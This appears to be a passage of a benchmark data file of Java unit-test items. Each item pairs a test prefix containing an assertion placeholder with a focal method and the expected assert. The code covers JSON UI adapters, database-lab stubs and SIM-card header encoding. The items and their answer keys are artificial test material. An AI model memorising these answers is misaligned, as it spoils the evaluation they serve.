jsonObject.toJson()); } FastBeanInfo beanInfo = new FastBeanInfo(type, Object.class); for (FastPropertyDescriptor desc : beanInfo.getPropertyDescriptors()) { Method m = desc.getReadMethod(); if (m == null) { continue; } // skip ignored annotated getters with context GUI IgnoreProperty ignoredPropertyAnnotation = m.getAnnotation(IgnoreProperty.class); if (ignoredPropertyAnnotation != null && Context.GUI.equals(ignoredPropertyAnnotation.value())) { continue; } String key = desc.getName(); Object val = m.invoke(m_bean); IJsonObject jsonObject = createJsonObject(val); properties.put(key, jsonObject.toJson()); } JSONObject jbean = new JSONObject(); for (Entry<String, Object> e : properties.entrySet()) { jbean.put(e.getKey(), e.getValue()); } return jbean; } catch (Exception e) { throw new IllegalArgumentException(type + "" to json"", e); } }"	"assertEquals(""2015-09-24 17:38:09.000"", json.getString(""date""))"
"testBeanWithByteArray() { BeanWithByteArray bean = new BeanWithByteArray(); String str = ""hello""; bean.setBytes(str.getBytes());  MainJsonObjectFactory factory = new MainJsonObjectFactory(); IJsonObject jsonObj = factory.createJsonObject(bean);  JSONObject json = (JSONObject) jsonObj.toJson(); ""<AssertPlaceHolder>""; }
toJson() { if (m_bean == null) { return null; }  Class<?> type = m_bean.getClass(); // basic types if (type.isPrimitive() || type == String.class || type == Boolean.class || Number.class.isAssignableFrom(type)) { return m_bean; }  // binary resource if (BinaryResource.class.isAssignableFrom(type)) { BinaryResource binaryResource = (BinaryResource) m_bean; m_binaryResourceMediator.addBinaryResource(binaryResource); return m_binaryResourceMediator.createUrl(binaryResource); }  // array if (type.isArray()) { JSONArray jsonArray = new JSONArray(); int n = Array.getLength(m_bean); for (int i = 0; i < n; i++) { IJsonObject jsonObject = createJsonObject(Array.get(m_bean, i)); jsonArray.put(jsonObject.toJson()); } return jsonArray; }  // collection if (Collection.class.isAssignableFrom(type)) { JSONArray jsonArray = new JSONArray(); Collection<?> collection = (Collection<?>) m_bean; for (Object object : collection) { IJsonObject jsonObject = createJsonObject(object); jsonArray.put(jsonObject.toJson()); } return jsonArray; }  // Map if (Map.class.isAssignableFrom(type)) { JSONObject jsonMap = new JSONObject(); Map<?, ?> map = (Map<?, ?>) m_bean; Set<? extends Entry<?, ?>> entries = map.entrySet(); for (Entry<?, ?> entry : entries) { if (!(entry.getKey() instanceof String)) { throw new IllegalArgumentException(""Cannot convert "" + type + "" to json object""); } IJsonObject jsonObject = createJsonObject(entry.getValue()); jsonMap.put((String) entry.getKey(), jsonObject.toJson()); } return jsonMap; }  // bean if (type.getName().startsWith(""java."")) { throw new IllegalArgumentException(""Cannot convert "" + type + "" to json object""); } try { SortedMap<String, Object> properties = new TreeMap<>(); for (Field f : type.getFields()) { if (Modifier.isStatic(f.getModifiers())) { continue; } String key = f.getName(); Object val = f.get(m_bean); IJsonObject jsonObject = createJsonObject(val); properties.put(key, jsonObject.toJson()); } FastBeanInfo beanInfo = new FastBeanInfo(type, Object.class); for (FastPropertyDescriptor desc : beanInfo.getPropertyDescriptors()) { Method m = desc.getReadMethod(); if (m == null) { continue; } // skip ignored annotated getters with context GUI IgnoreProperty ignoredPropertyAnnotation = m.getAnnotation(IgnoreProperty.class); if (ignoredPropertyAnnotation != null && Context.GUI.equals(ignoredPropertyAnnotation.value())) { continue; } String key = desc.getName(); Object val = m.invoke(m_bean); IJsonObject jsonObject = createJsonObject(val); properties.put(key, jsonObject.toJson()); } JSONObject jbean = new JSONObject(); for (Entry<String, Object> e : properties.entrySet()) { jbean.put(e.getKey(), e.getValue()); } return jbean; } catch (Exception e) { throw new IllegalArgumentException(type + "" to json"", e); } }"	"assertEquals(Base64Utility.encode(str.getBytes()), json.getString(""bytes""))"
"testJavaDateToJsonStringWithUTC() { Calendar cal = Calendar.getInstance(TimeZone.getTimeZone(""GMT+0400""));  cal.set(2015, 8, 24, 17, 38, 9); cal.set(Calendar.MILLISECOND, 579); ""<AssertPlaceHolder>""; }
asJsonString(boolean utc) { return asJsonString(utc, true, true); }"	"assertEquals(""2015-09-24 13:38:09.579Z"", new JsonDate(cal.getTime()).asJsonString(true))"
"testCtor_Data() { JSONObject data = new JSONObject(); JsonEvent event = new JsonEvent(""foo"", ""bar"", data); ""<AssertPlaceHolder>""; }
getData() { return m_data; }"	assertSame(data, event.getData())
"testAckNo() { JSONObject json = new JSONObject(); json.put(""uiSessionId"", ""123""); json.put(""#ACK"", ""777""); JsonRequest req = new JsonRequest(json); ""<AssertPlaceHolder>""; }
getAckSequenceNo() { return JsonObjectUtility.optLong(m_request, PROP_ACK_SEQUENCE_NO); }"	assertEquals(Long.valueOf(777), req.getAckSequenceNo())
"testExtensionByName() { UploadRequestHandler h = new UploadRequestHandler(); IUploadable uploadable = new IUploadable() { @Override public long getMaximumUploadSize() { return 0; }  @Override public Collection<String> getAcceptedUploadFileExtensions() { return Arrays.asList(""txt"", ""csv""); } }; Set<String> extSet = h.getValidFileExtensionsFor(uploadable, null); Assert.""<AssertPlaceHolder>""; }
getValidFileExtensionsFor(IUploadable uploadable, Map<String, String> uploadProperties) { Set<String> extSet = toExtensionsLowercase(uploadable.getAcceptedUploadFileExtensions()); if (extSet.isEmpty()) { return getValidFileExtensionsDefault(); } return extSet; }"	"assertEquals(""csv,txt"", extSet.stream().sorted().collect(Collectors.joining("","")))"
"testExtensionByMimeType() { UploadRequestHandler h = new UploadRequestHandler(); IUploadable uploadable = new IUploadable() { @Override public long getMaximumUploadSize() { return 0; }  @Override public Collection<String> getAcceptedUploadFileExtensions() { return Arrays.asList(""text/plain"", ""text/foobar"", ""image/gif"", ""image/foobar"", ""image/jpeg""); } }; Set<String> extSet = h.getValidFileExtensionsFor(uploadable, null); Assert.""<AssertPlaceHolder>""; }
getValidFileExtensionsFor(IUploadable uploadable, Map<String, String> uploadProperties) { Set<String> extSet = toExtensionsLowercase(uploadable.getAcceptedUploadFileExtensions()); if (extSet.isEmpty()) { return getValidFileExtensionsDefault(); } return extSet; }"	"assertEquals(""gif,jfif,jpe,jpeg,jpg,pjp,pjpeg,txt"", extSet.stream().sorted().collect(Collectors.joining("","")))"
"testNop() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	assertEquals(setOf(), new JsonFileChooserAcceptAttributeBuilder() .build())
"testNull() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	assertEquals(setOf(), new JsonFileChooserAcceptAttributeBuilder() .withType(null) .build())
"testNulls() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	assertEquals(setOf(), new JsonFileChooserAcceptAttributeBuilder() .withTypes(null) .build())
"testExt1() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf(""text/plain""), new JsonFileChooserAcceptAttributeBuilder() .withType(""txt"") .build())"
"testExt2() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf(""text/plain""), new JsonFileChooserAcceptAttributeBuilder() .withType("".txt"") .build())"
"testExt3() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf(""text/plain""), new JsonFileChooserAcceptAttributeBuilder() .withType(""*.txt"") .build())"
"testMime() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf(""text/plain""), new JsonFileChooserAcceptAttributeBuilder() .withType(MimeType.TXT.getType()) .build())"
"testExtWithCsv() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf("".csv""), new JsonFileChooserAcceptAttributeBuilder() .withType(""csv"") .build())"
"testMimeWithCsv() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf("".csv""), new JsonFileChooserAcceptAttributeBuilder() .withType(MimeType.CSV.getType()) .build())"
"testUnknownMime() { Assert.""<AssertPlaceHolder>""; }
build() { return new HashSet<>(m_mimeTypeToAcceptType.values()); }"	"assertEquals(setOf(""foo/bar""), new JsonFileChooserAcceptAttributeBuilder() .withType(""foo/bar"") .build())"
"testRequestFocusInPostLoad() { FormWithOneField form = new FormWithOneField(); IJsonAdapter<?> adapter = UiSessionTestUtility.newJsonAdapter(m_uiSession, form, m_uiSession.getRootJsonAdapter()); form.start(); ""<AssertPlaceHolder>""; form.doClose(); }
toJson() { JSONObject json = super.toJson(); putProperty(json, PROP_DISPLAY_HINT, displayHintToJson(getModel().getDisplayHint())); setInitialFocusProperty(json); putAdapterIdsProperty(json, ""views"", m_desktop.getViews(getModel())); putAdapterIdsProperty(json, ""dialogs"", m_desktop.getDialogs(getModel(), false)); putAdapterIdsProperty(json, ""messageBoxes"", m_desktop.getMessageBoxes(getModel())); putAdapterIdsProperty(json, ""fileChoosers"", m_desktop.getFileChoosers(getModel())); return json; }"	assertNotNull(adapter.toJson().get(JsonForm.PROP_INITIAL_FOCUS))
"JSONException { JSONObject json = m_stringField.toJson(); ""<AssertPlaceHolder>""; }
toJson() { JSONObject json = super.toJson(); if (isObfuscateDisplayTextRequired()) { json.put(PROP_INPUT_OBFUSCATED, true); } return json; }"	assertEquals(true, json.get(IStringField.PROP_MULTILINE_TEXT))
"JSONException { Table table = createTableFixture(5);  ITableRow row = table.getRow(2); JsonTable<ITable> jsonTable = m_uiSession.createJsonAdapter(table, new JsonAdapterMock()); jsonTable.toJson();  // ----------  JsonEvent event = createJsonRowsSelectedEvent(jsonTable.getOrCreateRowId(row)); jsonTable.handleUiEvent(event);  List<JsonEvent> responseEvents = JsonTestUtility.extractEventsFromResponse( m_uiSession.currentJsonResponse(), JsonTable.EVENT_ROWS_SELECTED); ""<AssertPlaceHolder>""; }
handleUiEvent(JsonEvent event) { if (EVENT_ROW_CLICK.equals(event.getType())) { handleUiRowClick(event); } else if (EVENT_ROW_ACTION.equals(event.getType())) { handleUiRowAction(event); } else if (EVENT_ROWS_SELECTED.equals(event.getType())) { handleUiRowsSelected(event); } else if (EVENT_RELOAD.equals(event.getType())) { handleUiReload(event); } else if (EVENT_RESET_COLUMNS.equals(event.getType())) { handleUiResetColumns(event); } else if (EVENT_SORT.equals(event.getType())) { handleUiSort(event); } else if (EVENT_GROUP.equals(event.getType())) { handleUiGroup(event); } else if (EVENT_COLUMN_MOVED.equals(event.getType())) { handleUiColumnMoved(event); } else if (EVENT_COLUMN_RESIZED.equals(event.getType())) { handleUiColumnResized(event); } else if (JsonEventType.APP_LINK_ACTION.matches(event.getType())) { handleUiAppLinkAction(event); } else if (EVENT_ROWS_CHECKED.equals(event.getType())) { handleUiRowChecked(event); } else if (EVENT_ROWS_EXPANDED.equals(event.getType())) { handleUiRowsExpanded(event); } else if (EVENT_PREPARE_CELL_EDIT.equals(event.getType())) { handleUiPrepareCellEdit(event); } else if (EVENT_COMPLETE_CELL_EDIT.equals(event.getType())) { handleUiCompleteCellEdit(event); } else if (EVENT_CANCEL_CELL_EDIT.equals(event.getType())) { handleUiCancelCellEdit(event); } else if (EVENT_CLIPBOARD_EXPORT.equals(event.getType())) { handleUiClipboardExport(event); } else if (EVENT_FILTER_ADDED.equals(event.getType())) { handleUiFilterAdded(event); } else if (EVENT_FILTER_REMOVED.equals(event.getType())) { handleUiFilterRemoved(event); } else if (EVENT_FILTER.equals(event.getType())) { handleUiFilter(event); } else if (EVENT_COLUMN_AGGR_FUNC_CHANGED.equals(event.getType())) { handleColumnAggregationFunctionChanged(event); } else if (EVENT_COLUMN_BACKGROUND_EFFECT_CHANGED.equals(event.getType())) { handleColumnBackgroundEffectChanged(event); } else if (EVENT_COLUMN_ORGANIZE_ACTION.equals(event.getType())) { handleUiColumnOrganizeAction(event); } else { super.handleUiEvent(event); } }"	assertEquals(0, responseEvents.size())
"JSONException { Table table = createTableFixture(5);  JsonTable<ITable> jsonTable = m_uiSession.createJsonAdapter(table, new JsonAdapterMock()); jsonTable.toJson(); IColumn column = table.getColumnSet().getFirstVisibleColumn();  // ----------  JsonEvent event = createJsonRowsSortedEvent(jsonTable.getColumnId(column), !column.isSortAscending()); jsonTable.handleUiEvent(event);  List<JsonEvent> responseEvents = JsonTestUtility.extractEventsFromResponse( m_uiSession.currentJsonResponse(), ""rowOrderChanged""); ""<AssertPlaceHolder>""; }
handleUiEvent(JsonEvent event) { if (EVENT_ROW_CLICK.equals(event.getType())) { handleUiRowClick(event); } else if (EVENT_ROW_ACTION.equals(event.getType())) { handleUiRowAction(event); } else if (EVENT_ROWS_SELECTED.equals(event.getType())) { handleUiRowsSelected(event); } else if (EVENT_RELOAD.equals(event.getType())) { handleUiReload(event); } else if (EVENT_RESET_COLUMNS.equals(event.getType())) { handleUiResetColumns(event); } else if (EVENT_SORT.equals(event.getType())) { handleUiSort(event); } else if (EVENT_GROUP.equals(event.getType())) { handleUiGroup(event); } else if (EVENT_COLUMN_MOVED.equals(event.getType())) { handleUiColumnMoved(event); } else if (EVENT_COLUMN_RESIZED.equals(event.getType())) { handleUiColumnResized(event); } else if (JsonEventType.APP_LINK_ACTION.matches(event.getType())) { handleUiAppLinkAction(event); } else if (EVENT_ROWS_CHECKED.equals(event.getType())) { handleUiRowChecked(event); } else if (EVENT_ROWS_EXPANDED.equals(event.getType())) { handleUiRowsExpanded(event); } else if (EVENT_PREPARE_CELL_EDIT.equals(event.getType())) { handleUiPrepareCellEdit(event); } else if (EVENT_COMPLETE_CELL_EDIT.equals(event.getType())) { handleUiCompleteCellEdit(event); } else if (EVENT_CANCEL_CELL_EDIT.equals(event.getType())) { handleUiCancelCellEdit(event); } else if (EVENT_CLIPBOARD_EXPORT.equals(event.getType())) { handleUiClipboardExport(event); } else if (EVENT_FILTER_ADDED.equals(event.getType())) { handleUiFilterAdded(event); } else if (EVENT_FILTER_REMOVED.equals(event.getType())) { handleUiFilterRemoved(event); } else if (EVENT_FILTER.equals(event.getType())) { handleUiFilter(event); } else if (EVENT_COLUMN_AGGR_FUNC_CHANGED.equals(event.getType())) { handleColumnAggregationFunctionChanged(event); } else if (EVENT_COLUMN_BACKGROUND_EFFECT_CHANGED.equals(event.getType())) { handleColumnBackgroundEffectChanged(event); } else if (EVENT_COLUMN_ORGANIZE_ACTION.equals(event.getType())) { handleUiColumnOrganizeAction(event); } else { super.handleUiEvent(event); } }"	assertEquals(0, responseEvents.size())
"JSONException { TableWith3Cols table = new TableWith3Cols(); table.fill(2); table.init();  IColumn<?> column0 = table.getColumns().get(0); JsonTable<ITable> jsonTable = m_uiSession.createJsonAdapter(table, new JsonAdapterMock()); jsonTable.toJson();  // ----------  JSONObject jsonRow = jsonTable.tableRowToJson(table.getRow(0)); JSONArray jsonCells = (JSONArray) jsonRow.get(""cells"");  JsonEvent event = createJsonColumnMovedEvent(jsonTable.getColumnId(column0), 2); jsonTable.handleUiEvent(event);  JSONObject jsonRowAfterMoving = jsonTable.tableRowToJson(table.getRow(0)); JSONArray jsonCellsAfterMoving = (JSONArray) jsonRowAfterMoving.get(""cells"");  // Expect same cell order, even if the columns are moved for (int i = 0; i < jsonCellsAfterMoving.length(); i++) { ""<AssertPlaceHolder>""; } }
tableRowToJson(ITableRow row) { JSONArray jsonCells = new JSONArray(); for (IColumn<?> column : getModel().getColumnSet().getColumns()) { // Don't use getColumnsInViewOrder because the cells of the rows have to be returned in the model order. The ui does a lookup using column.index. if (column.isVisible() && !column.isCompacted()) { jsonCells.put(cellToJson(row, column)); } } JSONObject jsonRow = new JSONObject(); putProperty(jsonRow, ""id"", getOrCreateRowId(row)); putProperty(jsonRow, ""parentRow"", getOrCreateRowId(getModel().findParentRow(row))); putProperty(jsonRow, ""cells"", jsonCells); putProperty(jsonRow, ""checked"", row.isChecked()); putProperty(jsonRow, ""enabled"", row.isEnabled()); putProperty(jsonRow, ""expanded"", row.isExpanded()); putProperty(jsonRow, ""iconId"", BinaryResourceUrlUtility.createIconUrl(row.getIconId())); putProperty(jsonRow, ""cssClass"", row.getCssClass()); if (row.getCustomValue(AbstractTableRowData.CUSTOM_VALUES_ID_GEO_LOCATION) != null) { JSONObject geoLocations = new JSONObject((Map<?, ?>) row.getCustomValue(AbstractTableRowData.CUSTOM_VALUES_ID_GEO_LOCATION)); putProperty(jsonRow, ""geoLocationValues"", geoLocations); } putProperty(jsonRow, ""compactValue"", BinaryResourceUrlUtility.replaceImageUrls(this, row.getCompactValue())); JsonObjectUtility.filterDefaultValues(jsonRow, ""TableRow""); return jsonRow; }"	assertEquals(jsonCells.get(i), jsonCellsAfterMoving.get(i))
"JSONException { TableWith3Cols table = new TableWith3Cols(); table.fill(2); table.init();  IColumn<?> column = table.getColumns().get(0); JsonTable<ITable> jsonTable = m_uiSession.createJsonAdapter(table, new JsonAdapterMock()); jsonTable.toJson();  // ----------  JsonEvent event = createJsonColumnMovedEvent(jsonTable.getColumnId(column), 2); jsonTable.handleUiEvent(event);  List<JsonEvent> responseEvents = JsonTestUtility.extractEventsFromResponse( m_uiSession.currentJsonResponse(), ""columnOrderChanged""); ""<AssertPlaceHolder>""; }
handleUiEvent(JsonEvent event) { if (EVENT_ROW_CLICK.equals(event.getType())) { handleUiRowClick(event); } else if (EVENT_ROW_ACTION.equals(event.getType())) { handleUiRowAction(event); } else if (EVENT_ROWS_SELECTED.equals(event.getType())) { handleUiRowsSelected(event); } else if (EVENT_RELOAD.equals(event.getType())) { handleUiReload(event); } else if (EVENT_RESET_COLUMNS.equals(event.getType())) { handleUiResetColumns(event); } else if (EVENT_SORT.equals(event.getType())) { handleUiSort(event); } else if (EVENT_GROUP.equals(event.getType())) { handleUiGroup(event); } else if (EVENT_COLUMN_MOVED.equals(event.getType())) { handleUiColumnMoved(event); } else if (EVENT_COLUMN_RESIZED.equals(event.getType())) { handleUiColumnResized(event); } else if (JsonEventType.APP_LINK_ACTION.matches(event.getType())) { handleUiAppLinkAction(event); } else if (EVENT_ROWS_CHECKED.equals(event.getType())) { handleUiRowChecked(event); } else if (EVENT_ROWS_EXPANDED.equals(event.getType())) { handleUiRowsExpanded(event); } else if (EVENT_PREPARE_CELL_EDIT.equals(event.getType())) { handleUiPrepareCellEdit(event); } else if (EVENT_COMPLETE_CELL_EDIT.equals(event.getType())) { handleUiCompleteCellEdit(event); } else if (EVENT_CANCEL_CELL_EDIT.equals(event.getType())) { handleUiCancelCellEdit(event); } else if (EVENT_CLIPBOARD_EXPORT.equals(event.getType())) { handleUiClipboardExport(event); } else if (EVENT_FILTER_ADDED.equals(event.getType())) { handleUiFilterAdded(event); } else if (EVENT_FILTER_REMOVED.equals(event.getType())) { handleUiFilterRemoved(event); } else if (EVENT_FILTER.equals(event.getType())) { handleUiFilter(event); } else if (EVENT_COLUMN_AGGR_FUNC_CHANGED.equals(event.getType())) { handleColumnAggregationFunctionChanged(event); } else if (EVENT_COLUMN_BACKGROUND_EFFECT_CHANGED.equals(event.getType())) { handleColumnBackgroundEffectChanged(event); } else if (EVENT_COLUMN_ORGANIZE_ACTION.equals(event.getType())) { handleUiColumnOrganizeAction(event); } else { super.handleUiEvent(event); } }"	assertEquals(0, responseEvents.size())
"JSONException { ITree tree = createTreeWithOneNode(); ITreeNode node = tree.getRootNode().getChildNode(0);  JsonTree<ITree> jsonTree = m_uiSession.createJsonAdapter(tree, new JsonAdapterMock());  JsonEvent event = createJsonSelectedEvent(jsonTree.getOrCreateNodeId(node)); jsonTree.handleUiEvent(event);  List<JsonEvent> responseEvents = JsonTestUtility.extractEventsFromResponse( m_uiSession.currentJsonResponse(), JsonTree.EVENT_NODES_SELECTED); ""<AssertPlaceHolder>""; }
handleUiEvent(JsonEvent event) { if (EVENT_NODE_CLICK.equals(event.getType())) { handleUiNodeClick(event); } else if (EVENT_NODE_ACTION.equals(event.getType())) { handleUiNodeAction(event); } else if (EVENT_NODES_SELECTED.equals(event.getType())) { handleUiNodesSelected(event); } else if (EVENT_NODE_EXPANDED.equals(event.getType())) { handleUiNodeExpanded(event); } else if (EVENT_NODES_CHECKED.equals(event.getType())) { handleUiNodesChecked(event); } else { super.handleUiEvent(event); } }"	assertEquals(0, responseEvents.size())
"JSONException { ITree tree = createTreeWithOneNode(); JsonTree<ITree> jsonTree = m_uiSession.createJsonAdapter(tree, new JsonAdapterMock()); Assert.""<AssertPlaceHolder>""; }
getOrCreateNodeId(ITreeNode node) { if (node == null) { return null; } if (isInvisibleRootNode(node)) { return null; } String id = m_treeNodeIds.get(node); if (id != null) { return id; } id = getUiSession().createUniqueId(); m_treeNodes.put(id, node); m_treeNodeIds.put(node, id); return id; }"	assertNull(jsonTree.getOrCreateNodeId(null))
"testInsertionOrderWithExpandEvent() { ITree tree = createTreeWithOneNode(); tree.getRootNode().setExpanded(true); JsonTree<ITree> jsonTree = m_uiSession.createJsonAdapter(tree, new JsonAdapterMock()); tree.setTreeChanging(true); TreeNode child = new TreeNode(); tree.addChildNode(tree.getRootNode(), child); child.setExpanded(true); tree.addChildNode(0, tree.getRootNode(), new TreeNode()); tree.setTreeChanging(false); ""<AssertPlaceHolder>""; }
eventBuffer() { return m_eventBuffer; }"	assertEquals(1, jsonTree.eventBuffer().consumeAndCoalesceEvents().size())
"testGetFilenameWithFingerprint_DynamicAdapterResourceUrl() { IJsonAdapter<Long> jsonAdapter = createJsonAdapterMock(""123"", ""abc"");  String url = ""dynamic/abc/123/"" + m_fingerprint + ""/foo.txt""; String expectedFilename = m_fingerprint + ""/foo.txt""; ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(IJsonAdapter<?> jsonAdapter, String path) { if (!checkDynamicAdapterResourceUrlArguments(jsonAdapter, path)) { return null; } DynamicResourceInfo info = DynamicResourceInfo.fromPath(jsonAdapter, path); if (info == null) { return null; } return info.getFileName(); }"	assertEquals(expectedFilename, BinaryResourceUrlUtility.getFilenameWithFingerprint(jsonAdapter, IOUtility.urlDecode(url)))
"testGetFilenameWithFingerprint_DynamicAdapterResourceUrl_NonAsciiFilename() { IJsonAdapter<Long> jsonAdapter = createJsonAdapterMock(""123"", ""abc"");  String url = ""dynamic/abc/123/"" + m_fingerprintSpecialFilename + ""/f%C3%A4%C3%A9.txt""; String expectedFilename = m_fingerprint + ""/fäé.txt""; ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(IJsonAdapter<?> jsonAdapter, String path) { if (!checkDynamicAdapterResourceUrlArguments(jsonAdapter, path)) { return null; } DynamicResourceInfo info = DynamicResourceInfo.fromPath(jsonAdapter, path); if (info == null) { return null; } return info.getFileName(); }"	assertEquals(expectedFilename, BinaryResourceUrlUtility.getFilenameWithFingerprint(jsonAdapter, IOUtility.urlDecode(url)))
"testGetFilenameWithFingerprint_WithContent() { String expectedFilename = m_fingerprint + ""/foo.txt""; ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(BinaryResource binaryResource) { return BinaryResourceUtility.createFilenameWithFingerprint(binaryResource); }"	assertEquals(expectedFilename, BinaryResourceUrlUtility.getFilenameWithFingerprint(m_binaryResource))
"testGetFilenameWithFingerprint_WithContent_NonAsciiFilename() { String expectedFilename = m_fingerprintSpecialFilename + ""/fäé.txt""; ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(BinaryResource binaryResource) { return BinaryResourceUtility.createFilenameWithFingerprint(binaryResource); }"	assertEquals(expectedFilename, BinaryResourceUrlUtility.getFilenameWithFingerprint(m_binaryResourceSpecialFilename))
"testGetFilenameWithFingerprint_WithoutContent() { BinaryResource binaryResource = new BinaryResource(""foo.txt"", null); ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(BinaryResource binaryResource) { return BinaryResourceUtility.createFilenameWithFingerprint(binaryResource); }"	"assertEquals(""foo.txt"", BinaryResourceUrlUtility.getFilenameWithFingerprint(binaryResource))"
"testGetFilenameWithFingerprint_WithoutContent_NonAsciiFilename() { BinaryResource binaryResource = new BinaryResource(""fäé.txt"", null); ""<AssertPlaceHolder>""; }
getFilenameWithFingerprint(BinaryResource binaryResource) { return BinaryResourceUtility.createFilenameWithFingerprint(binaryResource); }"	"assertEquals(""fäé.txt"", BinaryResourceUrlUtility.getFilenameWithFingerprint(binaryResource))"
"testGetWrongTopic() { m_registry.put(""topic"", createMessage(), noTransaction());  ""<AssertPlaceHolder>""; }
get(List<TopicDo> topics, String user) { List<UiNotificationDo> notifications = new ArrayList<>(); for (TopicDo topic : topics) { notifications.addAll(get(topic.getName(), user, topic.getLastNotifications())); } return notifications; }"	"assertEquals(new ArrayList<>(), m_registry.get(Arrays.asList(createGetAllTopic(""asdf"")), null))"
"""<AssertPlaceHolder>"";
getNumSlots() { return getHeaderSize() * 8; }"	assertEquals(32704, BTreeHeaderPage.getNumSlots())
"""<AssertPlaceHolder>"";
getTableId() { return tableId; }"	assertEquals(1, rootPtrId.getTableId())
"""<AssertPlaceHolder>"";
getPageNumber() { return pgNo; }"	assertEquals(0, rootPtrId.getPageNumber())
"""<AssertPlaceHolder>"";
getTableId(String name) throws NoSuchElementException { // some code goes here return 0; }"	assertEquals(id2, Database.getCatalog().getTableId(name))
"""<AssertPlaceHolder>"";
getTableId() { // some code goes here return 0; }"	assertEquals(1, pid.getTableId())
"""<AssertPlaceHolder>"";
getPageNumber() { // some code goes here return 0; }"	assertEquals(1, pid.getPageNumber())
"""<AssertPlaceHolder>"";
getTupleNumber() { // some code goes here return 0; }"	assertEquals(3, hrid.getTupleNumber())
"""<AssertPlaceHolder>"";
hashCode() { // some code goes here throw new UnsupportedOperationException(""implement this"");  }"	assertEquals(hrid.hashCode(), hrid2.hashCode())
"test_to_hex() { ""<AssertPlaceHolder>""; }
toHex(final byte b) { return new String(new char[]{ '0', 'x', HEX_CHARS[(b & 0xf0) >> 4], HEX_CHARS[b & 0x0f] }); }"	"assertEquals(""0xAB"", Util.toHex((byte) 0xab))"
"test_length_decode_invalid() { // ETSI TS 101 220 ""<AssertPlaceHolder>""; }
decodeLength(final byte[] bytes) { byte first = bytes[0]; if ((first & 0x80) == 0x00) { return first & 0xff; } int octets = (first ^ (byte) 0x80); if (octets > 3) { throw new IllegalArgumentException(""ETSI 102 220 encoded length has too many octets""); } int result = 0; for (int i = 1; i <= octets; i++) { byte next = bytes[i]; result |= (next & 0xff) << ((octets - i) * 8); } return result; // return ((bytes[1] & 0xff) << 8) + (first & 0xff); }"	assertEquals(0, Util.decodeLength(new byte[]{ (byte) 0x85 }))
"Exception {  CardProfile cardProfile = new CardProfile(); SPI spi = new SPI(); spi.setCommandSPI(CommandSPICoder.encode((byte) 0x00)); spi.setResponseSPI(ResponseSPICoder.encode((byte) 0x00)); cardProfile.setSPI(spi); cardProfile.setKIC(KICCoder.encode((byte) 0x00)); cardProfile.setKID(KIDCoder.encode(CertificationMode.NO_SECURITY, (byte) 0x00)); cardProfile.setTAR(new byte[]{ (byte) 0x00, (byte) 0x00, (byte) 0x00 });  byte[] bytes = CardProfileCoder.decode(cardProfile);  ""<AssertPlaceHolder>""; }
decode(CardProfile profile) throws CodingException {  if (profile == null) { throw new IllegalArgumentException(""The profile argument cannot be null""); }  ByteBuffer header = ByteBuffer.allocate(7);  byte commandSpi = CommandSPICoder.decode(profile.getSPI().getCommandSPI()); header.put(commandSpi); byte responseSpi = ResponseSPICoder.decode(profile.getSPI().getResponseSPI()); header.put(ResponseSPICoder.decode(profile.getSPI().getResponseSPI())); LOGGER.debug(""SPI: {}"", String.format(""%1$#x %2$#x"", commandSpi, responseSpi));  byte kic = KICCoder.decode(profile.getKIC()); header.put(kic); LOGGER.debug(""KIC: {}"", Util.toHex(kic));  byte kid = KIDCoder.decode(profile.getKID()); header.put(kid); LOGGER.debug(""KID: {}"", Util.toHex(kid));  byte[] tar = profile.getTAR(); header.put(tar); LOGGER.debug(""TAR: {}"", Util.toHexArray(tar));  return header.array(); }"	assertArrayEquals(new byte[]{ (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 }, bytes)
"Exception {  CardProfile cardProfile = new CardProfile(); SPI spi = new SPI(); spi.setCommandSPI(CommandSPICoder.encode((byte) 0x06)); spi.setResponseSPI(ResponseSPICoder.encode((byte) 0x21)); cardProfile.setSPI(spi); cardProfile.setKIC(KICCoder.encode((byte) 0x12)); cardProfile.setKID(KIDCoder.encode(CertificationMode.CC, (byte) 0x12)); cardProfile.setTAR(new byte[]{ (byte) 0xb0, (byte) 0x00, (byte) 0x10 });  byte[] bytes = CardProfileCoder.decode(cardProfile);  ""<AssertPlaceHolder>""; }
decode(CardProfile profile) throws CodingException {  if (profile == null) { throw new IllegalArgumentException(""The profile argument cannot be null""); }  ByteBuffer header = ByteBuffer.allocate(7);  byte commandSpi = CommandSPICoder.decode(profile.getSPI().getCommandSPI()); header.put(commandSpi); byte responseSpi = ResponseSPICoder.decode(profile.getSPI().getResponseSPI()); header.put(ResponseSPICoder.decode(profile.getSPI().getResponseSPI())); LOGGER.debug(""SPI: {}"", String.format(""%1$#x %2$#x"", commandSpi, responseSpi));  byte kic = KICCoder.decode(profile.getKIC()); header.put(kic); LOGGER.debug(""KIC: {}"", Util.toHex(kic));  byte kid = KIDCoder.decode(profile.getKID()); header.put(kid); LOGGER.debug(""KID: {}"", Util.toHex(kid));  byte[] tar = profile.getTAR(); header.put(tar); LOGGER.debug(""TAR: {}"", Util.toHexArray(tar));  return header.array(); }"	assertArrayEquals(new byte[]{ (byte) 0x06, (byte) 0x21, (byte) 0x12, (byte) 0x12, (byte) 0xb0, (byte) 0x00, (byte) 0x10 }, bytes)
